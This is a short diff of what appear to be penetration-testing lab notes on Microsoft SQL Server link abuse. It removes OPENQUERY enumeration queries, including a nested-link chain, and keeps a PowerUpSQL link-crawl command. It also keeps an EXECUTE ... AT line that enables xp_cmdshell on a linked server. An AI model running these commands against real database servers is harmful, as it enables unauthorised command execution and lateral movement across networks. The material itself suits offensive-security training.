@@ -913,16 +913,8 @@ Or
 
 Now - 
 
-```select * from openquery("dcorp-sql1",'select * from master..sysservers')```
-
-
 ```Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose```
 
-or via Openquery - queries can be chained to access links within links (nested links):
-
-```
-select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from master..sysservers'')')
-```
 
 #### Code Execution
 ```EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"```
